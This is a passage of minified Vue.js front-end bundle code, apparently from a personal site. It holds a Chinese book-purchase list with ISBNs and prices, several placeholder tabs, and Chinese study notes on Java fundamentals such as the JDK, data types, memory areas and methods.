,name:"故宫院长说皇宫",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"画传",lang:"zh",name:"唐伯虎画传",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"画传",lang:"zh",name:"郑板桥画传",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"画传",lang:"zh",name:"鲁迅画传",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---弗兰肯斯坦",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---美丽新世界",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---格列佛游记",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---远大前程",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---鲁滨逊漂流记",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---理智与情感",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---双城记",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---傲慢与偏见",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---纯真年代",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---睡谷传说 英伦见闻录",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---木偶奇遇记",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---返老还童 菲茨杰拉德短篇小说选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---爱伦·坡短篇小说选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---丧钟为谁而鸣",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---嘉莉妹妹",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---菊与刀",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---乞力马扎罗的雪海明威短篇小说集",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---欧·亨利短篇小说选集",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---房龙地理",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---人类的故事",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---人猿泰山",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---马克·吐温短篇小说选集",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---瓦尔登湖",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---杰克·伦敦小说选野性的呼唤海狼",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---永别了,武器",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---老人与海",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---变色龙契诃夫短篇小说选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---论自由（严复译文卷 ）",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---本杰明·富兰克林自传",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---钢铁是怎样炼成的",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---雪莱抒情诗选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---都柏林人",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---少年维特之烦恼",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---社会学研究（严复译文卷）",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---勃朗夫人抒情十四行诗集",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---培根散文集",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---莎士比亚长诗 精韵全译",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---国富论（严复译文卷  上册）",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---国富论（严复译文卷  下册）",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---海蒂",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---泰戈尔诗歌集新月集飞鸟集",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---地心游记",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---欧也妮·葛朗台",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---名人传",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---高老头",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---昆虫记",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---包法利夫人",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---茶花女",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---海底两万里",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---羊脂球:莫泊桑短篇小说选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---八十天环游地球",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---道林格雷的画像",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"中英对照名著",lang:"zh_en",name:"中英对照全译本---绿山墙的安妮",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"小说",lang:"en",name:"冰与火之歌---A song of ice and fire",series:!0,num:5,buy:1,date:"2020-10-25"},{type:"工具书",lang:"en",name:"说文解字",series:!0,num:5,buy:1,date:"2020-10-26"},{type:"工具书",lang:"en",name:"汉字树",series:!0,num:8,buy:1,date:"2020-10-26"},{type:"励志书",lang:"en",name:"不放弃你的梦想值得你拼尽全力",series:!1,num:1,buy:1,date:"2020-10-27"},{type:"励志书",lang:"en",name:"生活总会厚待努力的人",series:!1,num:1,buy:1,date:"2020-10-27"},{type:"励志书",lang:"en",name:"尼克胡哲---永不止步",series:!1,num:1,buy:1,date:"2020-10-27"},{type:"励志书",lang:"en",name:"尼克胡哲---人生不设限",series:!1,num:1,buy:1,date:"2020-10-27"},{type:"励志书",lang:"en",name:"尼克胡哲---我和世界不一样",series:!1,num:1,buy:1,date:"2020-10-27"},{type:"励志书",lang:"en",name:"尼克胡哲---谁都不敢欺负你",series:!1,num:1,buy:1,date:"2020-10-27"},{type:"励志书",lang:"en",name:"尼克胡哲---当世界暗下来，愿你仍信有光",series:!1,num:1,buy:1,date:"2020-10-27"},{type:"励志书",lang:"en",name:"尼克胡哲---永不止步",series:!1,num:1,buy:1,date:"2020-10-27"}],v={mixins:[g],data:function(){return{book_to_buy:b}},computed:{book_num:function(){var n=0;return b.map((function(r){n+=r.num})),n}},methods:{compute_lang_str:function(n){var r="";switch(n){case"en":r="英语";break;case"zh":r="中文";break;case"zh_en":r="中英双语";break;default:break}return r}}},h=v,S=Object(c["a"])(h,m,d,!1,null,"72dae812",null),y=S.exports,f=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n\n\nssss\n\n ")])},_=[],x={mixins:[g]},w=x,E=Object(c["a"])(w,f,_,!1,null,"2132ccbf",null),T=E.exports,k=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("table",{},[t("tbody",[t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510088278       ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("弗兰肯斯坦  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("24.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787519204204 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("美丽新世界  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("27.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510036682 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("格列佛游记  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("26.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787519246716 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("远大前程  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("66.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787506297004 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("鲁滨逊漂流记  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("18.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510010330 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("理智与情感  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("24.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787506294843 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("双城记  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("29.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787506296991 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("傲慢与偏见 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v(" 22.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510040023 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("纯真年代  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("28.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510099397 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("睡谷传说 英伦见闻录  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("29.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510033643")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("木偶奇遇记  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("14.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510088261 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("返老还童 菲茨杰拉德短篇小说选    \n                 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("24.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510032394 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("爱伦·坡短篇小说选  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("24.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510046001 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("丧钟为谁而鸣  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("39.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510032417 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("嘉莉妹妹  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("38.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510099380 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("菊与刀  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("31.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510041006 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("乞力马扎罗的雪海明威短篇小说集 \n          ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("29.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787506299350 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("欧·亨利短篇小说选集  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("19.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510022975 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("房龙地理  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("29.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510023651 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("人类的故事  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("29.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787519207199 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("人猿泰山  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("29.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787506299367 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("马克·吐温短篇小说选集  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("15.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510031458 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("瓦尔登湖  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("26.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510027833 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("杰克·伦敦小说选野性的呼唤海狼 \n          ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("29.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510044755 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("永别了,武器  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("26.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510027888 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("老人与海  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("12")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510045998 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("变色龙契诃夫短篇小说选  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("28.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510036330 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("论自由（严复译文卷 中英对照全译本） ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("19.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510031472 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("本杰明·富兰克林自传  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("16.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787519205430 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("钢铁是怎样炼成的  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("43.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510092220 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("雪莱抒情诗选  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("49.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510089244 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("都柏林人  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("22.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787506294850 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("少年维特之烦恼  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("15.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510040030 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("社会学研究（严复译文卷 中英对照全译本） ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("36.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510087417 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("勃朗*夫人抒情十四行诗集  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("18.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510040061 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("培根散文集  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("18.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510091797 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("莎士比亚长诗 精韵全译  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("34.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510041020 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("国富论（严复译文卷 中英对照全译本 套装上下册）\n          ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("75")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787519245115 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("海蒂  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("41.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510018633 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("泰戈尔诗歌集新月集飞鸟集  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("12.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510040047 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("地心游记  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("23.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510034640 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("欧也妮·葛朗台  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("18.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510044809 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("名人传  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("27.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510034633 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("高老头  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("24.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787519216337 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("昆虫记  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("32.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510033674 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("包法利夫人  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("29.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510032370 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("茶花女  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("18.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510031465 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("海底两万里  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("26.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510067112 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("羊脂球:莫泊桑短篇小说选  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("25.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510017636 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("八十天环游地球  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("18.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510044779 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("道林??格雷的画像  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("22.8")])],1)]),t("tr",[t("td",[t("font",{attrs:{size:"4"}},[n._v("9787510032387 ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("绿山墙的安妮  ")])],1),t("td",[t("font",{attrs:{size:"4"}},[n._v("25.8")])],1)])])])])},C=[],j={mixins:[g]},M=j,R=(t("b047"),Object(c["a"])(M,k,C,!1,null,"239e9e49",null)),L=R.exports,O=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n\n\nssss\n\n ")])},A=[],I={mixins:[g]},D=I,P=Object(c["a"])(D,O,A,!1,null,"851c4f7e",null),N=P.exports,q=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n\n\nssss\n\n ")])},H=[],B={mixins:[g]},F=B,U=Object(c["a"])(F,q,H,!1,null,"e8dd43fc",null),J=U.exports,z=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n\n\nssss\n\n ")])},W=[],$={mixins:[g]},G=$,V=Object(c["a"])(G,z,W,!1,null,"59b0e3c3",null),Q=V.exports,K=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n\n\nssss\n\n ")])},X=[],Y={mixins:[g]},Z=Y,nn=Object(c["a"])(Z,K,X,!1,null,"27d06984",null),rn=nn.exports,tn=t("1b62"),en={mixins:[tn["a"]],components:{m1:u,m2:y,m3:T,m4:L,m5:N,m6:J,m7:Q,m8:rn},data:function(){return{tab:"m1",tab_level:1,tabs:[{label:"web",value:"m1"},{label:"书架书单",value:"m2"},{label:"未开发",value:"m3"},{label:"未开发",value:"m4"},{label:"未开发",value:"m5"},{label:"未开发",value:"m6"},{label:"未开发",value:"m7"},{label:"未开发",value:"m8"}]}}},an=en,sn=Object(c["a"])(an,e,a,!1,null,"103a1ab3",null);r["default"]=sn.exports},2512:function(n,r,t){},"2cff":function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},a=[],i=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},s=[],o=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},l=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{staticClass:"text-h5"},[n._v("JAVA 基础")]),t("div",{staticClass:"text-h6"},[n._v(" 基本环境 ")]),t("pre",[n._v("    java SE ME  EE \n    跨平台  -- jvm 虚拟机  jvm 虚拟机本身 不能跨平台 java 程序在 不同平台的不同的 jvm 虚拟机  运行\n    JRE JDK JVM 作用 \n    开发java : 编写代码 编译代码  运行代码 \n    JRE : JAVA  Runtime Enviroment   包含 JVM 虚拟机 和 JAVA 核心 类库  \n    类= java 文件 ，每个 java 文件是一个 Java 类 \n    核心类库：  java 已写好的 非常核心的 代码仓库  ，很多个java  核心 类 文件 \n    代码中 会用到 java 存放在 JRE 中 写好的 核心 java 文件 比如： System   String Number \n    java 文件的 编译 是使用 java JDK 中的  编译工具 进行编译 ，编译为 jvm 能够识别运行的 程序文件 \n    JDK : JAVA development Kit  Java 语言的 软件开发工具包 ，内部包含了 代码的 编译工具和 运行工具 \n    流程：1.使用JDK中的编译工具编译 .java  文件到      .class 字节码文件，\n          2.使用JDK中的运行工具 将  .class 文件运行在  JVM 虚拟机当中  \n    总结：1. 编写代码 需要使用 JRE 中 java 已经写好的 代码 （核心类库）\n          2. 编译代码 需要使用 JDK 中 的 编译工具\n          3. 运行代码 需要使用 JDK 中 的  运行工具\n          4. 代码运行在  JVM 虚拟机当中  \n     JDK=( JRE=(JVM 虚拟机 + 核心类库)  + 开发工具=（编译工具 + 运行工具） )    \n     系统环境变量 添加变量 Java_Home  D:\\Program Files\\Java\\jdk1.8.0_91\n                   path 编辑 新建    %Java_Home%\\bin    %Java_Home%\\jre\\bin           \n    javac  AAA.java  执行生成 AAA.class 文件 \n    java  AAA    执行 AAA.class 文件 \n    main 方法 程序的 入口点\n    public static void main(String[] args ){\n    }\n    public 确保 文件名称和 类名 必须 同名         \n    java 关键字  基本  都是小写的\n   ")]),t("div",{staticClass:"text-h6"},[n._v(" 数据类型 ")]),t("pre",[n._v("       java 有字符串 和 字符 区别  字符串 双引号 任意个字符    字符 单引号 且只能1个字符 \n      不同数据类型  占用内存空间\n      byte 1 short 2 int 4 long 8     float 4 double 8  char 2 boolean 1 \n      引用数据类型： class interface  array\n      基本数据类型  整数 浮点数 字符  布尔 \n      int a = 1;\n      float b = 1.36F; float 类型 不加 F 标识， 则默认 double 类型转换 会报错 丢失精度\n      long c = 556188L; long 类型  后面加 L 标识\n    数据范围关系 从小到大\n    byte, (short=char) , int ,long ,float ,double \n    隐式转换 小的直接变大的\n    运算过程中，小的会先提升为大的，当类型统一之后，再进行运算 。 同类型 运算\n    byte short char 三种数据类型在运算的时候，不管是否有更高的数据类型，都会提升为 int 然后再运算\n    也就是 最低隐士转换为 int 类型 ， 结果 最低是 int 类型\n    强制转换  大的转小的 强转格式 ： int a=10; byte b= (byte)a;   强转可能丢失精度\n    byte d =3+4 ; java 中存在常量优化机制：\n     根据常量计算的结果 判定是否在类型范围内，在就编译通过，不在就报错\n        java 变量作用域： 只在 变量所在的大括号内有用 \n     java 整数相除 结果是整数  10/3 = 3    10/3.0 = 3.333333...\n     \t char b = 'a';\t int c= b +20;  结果  c = 117 ; 字节 a 对应的 ASCII 码表 97 \n          1+99+“年” = \"100年\"\n           &  并且 |  或者 ！ 非 ^ 异或      && || 短路 效果\n           &  |无论如何 左右都会执行 && || 有短路效果 左边值能确定结果 则 右边不执行\n    break continue 只能跳出自己所在的那一层关系。\n    如果想要跳出跳过置顶一层，可以加入标号。\n    IDEA 目录层级关系： project - module - package - class \n    快捷键：\n    ctrl+shirt+a    ctrl+alt+v   ctrl+alt+m 包裹方法\n    psvm ，sout , alt+1，alt+4 ,ctrl+alt+l ,alt+enter   ,ctrl+b 跟进源码\n    数组 int[] arr= new int[30]  初始化定义一个长度是30的数组\n         int arr[] =new int[30]\n    sout 输出 数组 变量 输出的是 数组的 内存地址 \n    java 内存分配： \n    栈内存 ： 方法运行时，进入的内存，局部变量都存放于这块内存中，\n    堆内存 ： new 出来的内容都会进入堆内存，并且会有对应的地址值\n    方法区 ： 字节码文件 .class 加载时进入的内存 \n    本地方法栈 ：调用操作系统相关的资源\n    寄存器： 交给CPU 去使用\n    类的加载过程：\n    1.类的字节码文件加载进方法区 main 方法存放在自己吗文件中\n    2.main方法被jvm 自动调用进入栈内存中执行\n    3. 因为main 方法在 栈内存 ，创建变量 也在 栈内存\n    4.new 方法创建的实例放在堆内存中 ， 有 内存地址，并且有默认初始化值。\n      把地址值给到 变量。（因此打印数组，打印出来的是内存地址）\n    java 数组默认值\n    整数型 0  浮点数 0.0 布尔 false 字符  空字符  引用数据类型 null  \n    int[] arr=new int[]{5,7,8,999};    \n    int[] arr={5,7,8,999};     arr[0]   \n    方法定义：\n    格式：\n     public static void aaa(int num){  //方法体 }\n     public static int aaa(int num){   return 100; //方法体 }  int bb = aaa(30);\n     public static int[] aaa(int[] arr){   int[] b={1,2,3}    return b //方法体 }  int[] cc = aaa(arr) \n    方法和方法之间 是平级 关系 ，不能嵌套定义\n    栈内存： 手枪弹夹  先进后出\n    方法参数类型 和个数 必须匹配 \n    方法的形参，相当于一个局部变量\n    方法重载： java 允许 多个个相同方法名，但是形参不同的方法存在。（个数，类型，顺序）\n               Java jvm 会通过 参数去匹配调用哪个方法  \n    方法参数传递：\n            基本数据类型 ，传递的是值本身，改变传入值，是改变的这个值 ，对其他无影响。不影响原始值\n            引用数据类型 ，传递的是 内存地址 。 改变的是堆内存内的数据。会改变传入的数据本身\n     原码 反码 补码\n     